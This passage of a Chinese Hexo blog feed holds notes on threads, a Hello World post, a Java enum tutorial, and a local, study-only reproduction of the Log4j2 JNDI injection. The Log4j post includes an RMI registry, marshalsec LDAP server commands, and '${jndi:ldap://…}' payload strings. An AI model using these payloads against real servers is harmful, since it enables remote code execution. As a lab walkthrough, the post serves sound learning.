src="http://pic.baicai.icu/cpu和线程的问题.assets/轻量级进程.jpg" alt="轻量级进程"></li></ul></li><li><p>在实际程序中我们一般不直接使用内核线程，用户线程与内核线程之间需要一种中间数据结构，它由内核支持且是内核线程的高级抽象，这个高级接口被称为轻量级进程。从某种层面上看，LWP最多算是广义的用户线程，即我们通常所讲的线程。LWP线程库以内核为基础，很多操作要进行内核调用。</p></li></ul><h4 id="⭐线程实现的位置"><a href="#⭐线程实现的位置" class="headerlink" title="⭐线程实现的位置"></a>⭐线程实现的位置</h4><h4 id="📗线程实现在用户空间下"><a href="#📗线程实现在用户空间下" class="headerlink" title="📗线程实现在用户空间下"></a>📗线程实现在用户空间下</h4><p><strong><font color="#ef7050">「在早期的操作系统中，所有的线程都是在用户空间下实现的，即不支持内核级线程，只支持用户级线程，CPU的时间片切换是以进程为维度的。」</font></strong></p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/线程实现在用户空间_r.jpg" alt="线程实现在用户空间_r"></p><h4 id="📗线程实现在内核空间下"><a href="#📗线程实现在内核空间下" class="headerlink" title="📗线程实现在内核空间下"></a>📗线程实现在内核空间下</h4><ul><li>由于现在主流的操作系统都支持<code>用户级线程</code>和<code>内核级线程</code>，而这两种线程存在于两个不同的内存空间，如何使用合理地使用这两种线程就成为了一个问题，于是就<code>“多线程模型”</code>。</li></ul><h5 id="📌多对一线程模型"><a href="#📌多对一线程模型" class="headerlink" title="📌多对一线程模型"></a>📌多对一线程模型</h5><ul><li><img src="C:\Users\YH\Desktop\多对一模型.png" alt="多对一模型"></li><li>虽然该线程模型实现了<code>内核级线程</code>，但是</li><li>一个进程对应一个内核级线程</li></ul><p>对着王道的视频看完，结合三秋，和google的总结一下。得出个了覆盖了王道的视频全部，然后去清华那边对比将内容补充完整，最后与剩下的资料一一校对</p><ul><li><a href="https://www.bilibili.com/video/BV1YE411D7nH/?spm_id_from=333.337.search-card.all.click">王道</a></li><li><a href="https://zhuanlan.zhihu.com/p/343597285">知乎-用户空间和内核空间的区别</a></li><li><a href="https://fhfirehuo.github.io/Attacking-Java-Rookie/Chapter07/Thread.html">Java线程与内核线程</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;？？问题&quot;&gt;&lt;a href=&quot;#？？问题&quot; class=&quot;headerlink&quot; title=&quot;？？问题&quot;&gt;&lt;/a&gt;？？问题&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;一个六核十二线程为什么可以执行以一个300个线程的软件&lt;ul&gt;
&lt;li&gt;首先6核只有6线程，但是通过超线程实现了</summary>
      
    
    
    
    <category term="categories1" scheme="https://baicai.icu/categories/categories1/"/>
    
    
    <category term="tags1" scheme="https://baicai.icu/tags/tags1/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://baicai.icu/posts/4a17b156.html"/>
    <id>https://baicai.icu/posts/4a17b156.html</id>
    <published>2022-12-06T06:50:47.673Z</published>
    <updated>2022-12-06T06:50:47.673Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    <category term="categories4" scheme="https://baicai.icu/categories/categories4/"/>
    
    
    <category term="tags2" scheme="https://baicai.icu/tags/tags2/"/>
    
  </entry>
  
  <entry>
    <title>休息休息</title>
    <link href="https://baicai.icu/posts/b860aee8.html"/>
    <id>https://baicai.icu/posts/b860aee8.html</id>
    <published>2022-12-06T06:50:47.673Z</published>
    <updated>2022-12-06T06:50:47.673Z</updated>
    
    <content type="html"><![CDATA[<h4 id="⭐前提说明"><a href="#⭐前提说明" class="headerlink" title="⭐前提说明"></a>⭐前提说明</h4><ul><li>最近Apache Log4j被爆出有JNDI注入的漏洞，网上已经有非常详细的解释了，咱们也跟风一次，复现一下过程。</li><li><font color="red">【**本地演示全部在本地进行，文章内容仅限于学习研究之用，不要用于非法用途，不传播。**】</font></li></ul><p><br/></p><h4 id="⭐什么是JNDI"><a href="#⭐什么是JNDI" class="headerlink" title="⭐什么是JNDI"></a>⭐什么是JNDI</h4><ul><li>JNDI，全名：Java Name Directory Interface，SUN公司提供的一种标准的Java命名系统接口</li><li>JNDI主要有两部分组成：应用程序编程接口【<strong>API</strong>】和服务供应商接口【<strong>SPI</strong>】。<ul><li>应用程序编程接口：提供了Java应用程序<strong>访问</strong>各种命名和<strong>目录服务</strong>的功能</li><li>服务供应商接口：提供了任意一种服务的供应商使用的功能。</li></ul></li><li>通俗点来说，sun公司定义了规范【即JNDI】，服务提供商通过JNDI规范创造服务，开发人员通过服务商提供的服务和JNDI规范创造应用。如果没有同一个标准，不同的服务商与开发人员，有着各种各样的标准，这学习成本，光记忆不同标准就需要花非常多时间，所以JNDI是非常必要的。</li><li>咱们只是引用下别人的知识，如果那里写得错了，可以留言告诉我</li></ul><p><br/></p><h4 id="⭐其他服务"><a href="#⭐其他服务" class="headerlink" title="⭐其他服务"></a>⭐其他服务</h4><ul><li>RMI【JAVA远程方法调用】</li><li>LDAP【轻量级目录访问协议】</li><li>CORBA【公共对象请求代理体系结构】</li><li>DNS【域名服务】</li></ul><p><br/></p><h4 id="⭐JNDI和不同服务"><a href="#⭐JNDI和不同服务" class="headerlink" title="⭐JNDI和不同服务"></a>⭐JNDI和不同服务</h4><ul><li>JNDI的存在其实是为了协同其他应用来进行远程服务，它可以在客户端和服务端中都进行一些工作，其目的是为了将应用统一管理。</li><li>所以log4j漏洞就是通过其他服务注入到本地服务的JNDI</li></ul><p><br/></p><h4 id="⭐log4J漏洞执行流程"><a href="#⭐log4J漏洞执行流程" class="headerlink" title="⭐log4J漏洞执行流程"></a>⭐log4J漏洞执行流程</h4><ul><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/log4j原理.png" alt="log4j原理"></li></ul><p><br/></p><h4 id="⭐创建springboot工程"><a href="#⭐创建springboot工程" class="headerlink" title="⭐创建springboot工程"></a>⭐创建springboot工程</h4><ul><li><p>导入依赖，springboot好像默认使用slf4j+logback的方式来记录日志。所以需要去掉默认设置</p></li><li><p>```xml</p><!--导入springboot，去掉默认日志--><p><dependency></p><pre><code>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;exclusions&gt;    &lt;exclusion&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;    &lt;/exclusion&gt;&lt;/exclusions&gt;</code></pre><p>&lt;/dependency&gt;</p><!--加入log4j--><p><dependency></p><pre><code>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;version&gt;2.1.4.RELEASE&lt;/version&gt;</code></pre><p>&lt;/dependency&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">#### ⭐JNDI与RMI复现log4j漏洞</span><br><span class="line"></span><br><span class="line">- 启动一个JNDI服务并绑定一个恶意类【恶意类实现不提供了，大体上是让本地服务弹出计算器】</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public class RmiServer &#123;</span><br><span class="line">        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">            //启动一个JNDI服务</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">    </span><br><span class="line">            //创建一个恶意资源，注意参数className，factory的前缀，前缀代表了包的结构</span><br><span class="line">            Reference reference = new Reference(&quot;***&quot;, &quot;***&quot;, &quot;http://127.0.0.1:8081/&quot;);</span><br><span class="line">            ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);</span><br><span class="line">    </span><br><span class="line">            //给资源命名，并绑定</span><br><span class="line">            registry.bind(&quot;remote&quot;, refObjWrapper);</span><br><span class="line">    </span><br><span class="line">            System.out.println(&quot;攻击资源已经绑定到JNDI...&#x27;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义一个Restful风格的方法，方法中创建log4j对象并调用记录日志的方法，其实是模拟了服务器记录平常的日志信息</p><ul><li><font color="red">【注意：高本版JDK默认不允许从远程的Codebase加载Reference工厂类，需要手动开启】</font> </li><li><p>```java<br>@Controller<br>@RequestMapping(“/Rmi”)<br>public class Rmi {</p><pre><code>private static final Logger logger = LogManager.getLogger(Rmi.class);@GetMappingpublic void login() &#123;    System.out.println(&quot;记录登录日志&quot;);    //The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.    System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);    //JNDI注入，模拟用户恶意请求    logger.error(&quot;$&#123;jndi:rmi://你的IP/remote&#125;&quot;);&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- log4j执行原理网上有很多分析了，大概原理如下</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    @Test</span><br><span class="line">    public void Jndi()&#123;</span><br><span class="line">        //log4j包含了这个执行顺序，所有只需要修改lookup的uri参数就能注入JNDI</span><br><span class="line">        try &#123;</span><br><span class="line">            System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">            String uri = &quot;rmi://你的IP/remote&quot;;</span><br><span class="line">            Context ctx = new InitialContext();</span><br><span class="line">            Object lookup = ctx.lookup(uri);</span><br><span class="line">            System.out.println(lookup);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>启动springboot并调用对应的方法，效果如下</p><ul><li>可以看到请求的是本地服务，然后本地服务执行的代码应该是记录日志才对，但是却执行了远端的代码，而远端代码成功让本地服务弹出了电脑的计算器</li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/log4j原理gif.gif" alt="log4j原理gif"></li></ul></li></ul><p><br/></p><h4 id="⭐JNDI与LDAP复现log4j漏洞"><a href="#⭐JNDI与LDAP复现log4j漏洞" class="headerlink" title="⭐JNDI与LDAP复现log4j漏洞"></a>⭐JNDI与LDAP复现log4j漏洞</h4><ul><li>还是老样子，在本地构建一个远端服务，该服务包含了ldap协议</li></ul><p><br/></p><p>✅从github下工具包</p><ul><li>随便找个文件夹克隆git仓库<ul><li><code>git clone git@github.com:mbechler/marshalsec.git</code></li></ul></li><li>保持路径不变，使用命令打开文件夹<ul><li><code>cd marshalsec</code></li></ul></li><li>进入文件夹后，使用maven命令打包，前提是电脑已经安装与配置过maven工具<ul><li><code>mvn clean package -DskipTests</code></li></ul></li><li>打包成功后，在文件夹中找到以下两个压缩包，后面需要这两个jar包创建一个包含ldap的服务<ul><li><code>marshalsec-0.0.3-SNAPSHOT</code></li><li><code>marshalsec-0.0.3-SNAPSHOT-all</code></li></ul></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/获取ldap驱动包.png" alt="获取ldap驱动包"></li></ul><p><br/></p><p>✅创建ldap服务</p><ul><li>复制上面两个jar包到idea工程的随便一个文件夹</li><li>在该文件夹下创建一个恶意类<ul><li><font color="red">【注意：不能包含包名，不能有中文，不能直接别的地方复制【必须手写，好像idea也不允许复制class文件】】</font> </li></ul></li><li>从终端打开该文件夹，编写最初的javac命令，将恶意类编译成class文件<ul><li><code>javac Attack.java</code></li></ul></li><li>使用命令创建ldap服务并绑定恶意类<ul><li>注意：有的终端命令打印可能没有<code>#</code>号，执行的命令中必须包含<code>#</code>号</li><li><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:1389/#Attack&quot;</code></li></ul></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/创建ldap服务绑定攻击类.png" alt="创建ldap服务绑定攻击类"></li></ul><p><br/></p><p>✅启动springboot并访问</p><ul><li><p>与上面一样，创建并启动一个springboot，能用浏览器访问到log4j对象中记录日志的方法即可</p><ul><li><font color="red">【也需要开启允许从远程的Codebase加载Reference工厂类】</font> </li><li><pre><code class="lang-java">@Controller@RequestMapping(&quot;/LDAP&quot;)public class LDAP &#123;    private static final Logger logger = LogManager.getLogger(LDAP.class);    @GetMapping    public void login() &#123;        System.setProperty(&quot;com.sun.jndi.Ldap.object.trustURLCodebase&quot;, &quot;true&quot;);        logger.error(&quot;params:&#123;&#125;&quot;,&quot;$&#123;jndi:ldap://127.0.0.1:1389/Attack&#125;&quot;);    &#125;&#125;</code></pre></li></ul></li><li><p>可以看到与上面一样，访问的还是本地的服务，本地服务也应该记录日志才对，但是一样执行了远端的代码，而远端代码同样成功让本地服务弹出了电脑的计算器</p><ul><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/ldap.gif" alt="ldap"></li></ul></li></ul><p><br/></p><h4 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h4><ul><li>其实这个漏洞其实非常危险的，因为它能让服务器执行任意代码，而我们现实中很多东西实际上在服务器不就是一堆数据而已嘛</li><li>不过大厂都有安全顾问，也有非常多的安全措施</li><li>现在网络上已经有很多解决方案了，而且也有很多人在修复问题了</li><li>最后<strong>网络不是法外之地</strong></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/网络不是法外之地.jpg" alt="网络不是法外之地"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;⭐前提说明&quot;&gt;&lt;a href=&quot;#⭐前提说明&quot; class=&quot;headerlink&quot; title=&quot;⭐前提说明&quot;&gt;&lt;/a&gt;⭐前提说明&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;最近Apache Log4j被爆出有JNDI注入的漏洞，网上已经有非常详细的解释了，咱们也跟风一次，复现</summary>
      
    
    
    
    <category term="categories3" scheme="https://baicai.icu/categories/categories3/"/>
    
    
    <category term="tags3" scheme="https://baicai.icu/tags/tags3/"/>
    
  </entry>
  
  <entry>
    <title>大萨达</title>
    <link href="https://baicai.icu/posts/6803c72c.html"/>
    <id>https://baicai.icu/posts/6803c72c.html</id>
    <published>2022-12-06T06:50:47.673Z</published>
    <updated>2022-12-06T06:50:47.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h4 id="⭐什么是枚举"><a href="#⭐什么是枚举" class="headerlink" title="⭐什么是枚举"></a>⭐什么是枚举</h4><ul><li>中文的释义，指的是可以一个一个列举</li><li><p>即在一个特定的范围内，有穷的集合，如一年有12个月，一周有7天</p></li><li><p>正因为这种有穷的集合，通常在代码设计中，使用枚举类来定义词典，如是否删除的表示，y表示是，n表示否，也可以说，键值对的映射关系，类似与map集合，redis这种。</p></li></ul><h4 id="⭐Java中的枚举诞生"><a href="#⭐Java中的枚举诞生" class="headerlink" title="⭐Java中的枚举诞生"></a>⭐Java中的枚举诞生</h4><h5 id="✅为何需要枚举类型"><a href="#✅为何需要枚举类型" class="headerlink" title="✅为何需要枚举类型"></a>✅为何需要枚举类型</h5><ul><li>枚举类型是 Java 5 中增加的一个小特性，在此之前，实现枚举的方式为定义编译期常量形式。代码中使用编译期常量的方式在理解性和安全性方面存在不足，单纯的常量数值不能够直观的体现出其作为枚举实例的目的，且实际中无限的取值空间也不能很好的与理论上有限的枚举空间相匹配。</li></ul><h5 id="✅静态常量实现字典"><a href="#✅静态常量实现字典" class="headerlink" title="✅静态常量实现字典"></a>✅静态常量实现字典</h5><ul><li><p>假定使用int类型定义一年中的四季    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SPRING</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUMMER</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">AUTUMN</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">WINTER</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">testSeason</span><span class="params">(<span class="type">int</span> season)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (season)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"><span class="comment">// 春天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"><span class="comment">// 夏天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line"><span class="comment">// 秋天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line"><span class="comment">// 冬天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Season.SPRING);</span><br><span class="line">System.out.println(Season.SUMMER);</span><br><span class="line"></span><br><span class="line">testSeason(<span class="number">1</span>);</span><br><span class="line">testSeason(Season.SPRING)</span><br><span class="line">testSeason(-<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><ul><li><font color="Orange">*可以看到没有办法通知或者限制调用者需要传递的参数，只要是int值都是合法数据，这个算不上一个好的设计*</font> </li></ul><h5 id="✅改进静态常量实现字典"><a href="#✅改进静态常量实现字典" class="headerlink" title="✅改进静态常量实现字典"></a>✅改进静态常量实现字典</h5><ul><li><p>改进上述例子，就可以让一个普通类达到枚举一样效果（这也是枚举<a href="#mime">反编译</a>后的效果，下文有详述）</p><ul><li><p>将上述的int类型常量修改为Season类型，并将类声明为final防止被继承。构造函数声明为private，防止外部实例化。</p></li><li><p>```java<br>public final class Season {</p><pre><code>public static final Season SPRING = new Season();public static final Season SUMMER = new Season();public static final Season AUTUMN = new Season();public static final Season WINTER = new Season();private Season()&#123;&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- ```java</span><br><span class="line">  void testSeason(Season season)&#123;</span><br><span class="line">  // ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>testSeason(Season.SPRING);<br>testSeason(Season.SUMMER);</p><p>testSeason(1);// 编译报错<br>testSeason(“SPRING”);// 编译报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- &lt;font color=&quot;Orange&quot;&gt;*可以看到没有通知调用者情况下，调用者只能传递已经定义好的Season类型，最多传递一个null，否则将无法通过编译，这也间接限制了调用者传递的数据类型*&lt;/font&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅枚举实现字典</span><br><span class="line"></span><br><span class="line">- 例如：一个季节枚举即可表示一年中的四季</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public enum SeasonEnum &#123;</span><br><span class="line">        SPRING,</span><br><span class="line">        SUMMER,</span><br><span class="line">        AUTUMN,</span><br><span class="line">        WINTER;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>void testSeason2(SeasonEnum season){</p><pre><code>switch (season)&#123;    case SPRING :        // 春天...        break;    case SUMMER :        // 夏天...        break;    case AUTUMN :        // 秋天...        break;    case WINTER :        // 冬天...        break;&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  testSeason(SeasonEnum.SPRING);</span><br><span class="line">  testSeason(SeasonEnum.SUMMER);</span><br><span class="line">  </span><br><span class="line">  testSeason(1);// 编译报错</span><br><span class="line">  testSeason(&quot;SPRING&quot;);// 编译报错</span><br></pre></td></tr></table></figure></li><li><font color="Orange">*可以看到，枚举类型的实例摆脱了数值的限制，能够以实例自身表达其作用和目的*</font> </li></ul></li></ul><h4 id="⭐定义枚举"><a href="#⭐定义枚举" class="headerlink" title="⭐定义枚举"></a>⭐定义枚举</h4><h5 id="✅规则"><a href="#✅规则" class="headerlink" title="✅规则"></a>✅规则</h5><ol><li>使用关键字<code>Enum</code>定义枚举</li><li>枚举值需要定义在枚举的构造方法，成员变量之前，枚举值以<code>;</code>分号结束<ul><li>这里的枚举值，和Java语法要求必须先定义enum实例是同一个意思，<strong>实际上通过反编译来看就是一个 static final 构造方法</strong></li></ul></li><li>枚举的构造方法<ul><li>可以使用<code>lombok</code>的无参构造方法<code>@NoArgsConstructor</code>和全参构造构造方法<code>@AllArgsConstructor</code></li><li>但是不能使用<code>lombok</code>的<code>@Data</code>，原因可能在编译的时候，枚举值编译成<code>static final</code>，无法再使用<code>@Data</code>的setter方法</li></ul></li><li>命名（阿里巴巴Java开发手册1.4.0）<ul><li><img src="枚举.assets/阿里巴巴开发手册-枚举.png" alt="阿里巴巴开发手册-枚举"></li><li><img src="枚举.assets/阿里巴巴开发手册-枚举2.png" alt="阿里巴巴开发手册-枚举2"></li></ul></li></ol><ul><li>需要注意的只有以上4点，其余部分和普通类一样，可以在枚举中定义普通的方法，接口，重写方法等等</li></ul><h5 id="✅示例"><a href="#✅示例" class="headerlink" title="✅示例"></a>✅示例</h5><ul><li>```java<br>// 最简单的枚举<br>public enum SeasonEnum {<pre><code>SPRING,SUMMER,AUTUMN,WINTER;</code></pre>} <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // 接口</span><br><span class="line">  public interface Sports &#123;</span><br><span class="line">      void swim();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 带参的枚举，实现接口并重写toString方法</span><br><span class="line">  @NoArgsConstructor</span><br><span class="line">  @AllArgsConstructor</span><br><span class="line">  public enum SeasonEnum implements Sports&#123;</span><br><span class="line">      SPRING(&quot;1&quot;,&quot;春天&quot;),</span><br><span class="line">      SUMMER(&quot;2&quot;,&quot;夏天&quot;),</span><br><span class="line">      AUTUMN(&quot;3&quot;,&quot;秋天&quot;),</span><br><span class="line">      WINTER(&quot;4&quot;,&quot;冬天&quot;);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">      @Getter</span><br><span class="line">      private String index;</span><br><span class="line">  </span><br><span class="line">      @Getter</span><br><span class="line">      private String description;</span><br><span class="line">  </span><br><span class="line">      @Override</span><br><span class="line">      public String toString() &#123;</span><br><span class="line">          return &quot;SeasonEnum&#123;&quot; +</span><br><span class="line">                  &quot;description=&#x27;&quot; + description + &#x27;\&#x27;&#x27; +</span><br><span class="line">                  &quot;, index=&#x27;&quot; + index + &#x27;\&#x27;&#x27; +</span><br><span class="line">                  &#x27;&#125;&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      public void printSeason()&#123;</span><br><span class="line">          System.out.println(&quot;该枚举值的中文描述为：&quot; +this.description);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      @Override</span><br><span class="line">      public void swim() &#123;</span><br><span class="line">          System.out.println(&quot;夏天最好运动的方式是游泳...&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="⭐反编译"><a href="#⭐反编译" class="headerlink" title="⭐反编译"></a>⭐反编译</h4><h5 id="✅命令反编译"><a href="#✅命令反编译" class="headerlink" title="✅命令反编译"></a>✅<span id="mime">命令反编译</span></h5><ul><li>使用<code>javap -c SeasonEnum.class</code>命令反编译上述<code>SeasonEnum</code>枚举的字节码文件<ul><li><img src="枚举.assets/反编译1.png" alt="反编译1"></li><li><img 